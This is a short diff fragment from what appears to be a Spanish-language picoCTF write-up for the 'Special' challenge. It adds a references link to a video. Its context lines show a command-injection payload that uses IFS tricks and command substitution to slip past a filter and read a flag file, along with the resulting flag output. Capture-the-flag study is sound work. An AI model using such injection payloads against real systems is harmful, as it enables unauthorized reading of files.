@@ -48,3 +48,5 @@ $(IFS=];b=cat]blargh/flag.txt;$b)
 sh: 1: picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}: not found
 Special$ 
 
+Referencias
+https://www.youtube.com/watch?v=aF6UIFJKCic&pp=ygUQRXNwZWNpYWwgcGljb2N0Zg%3D%3D
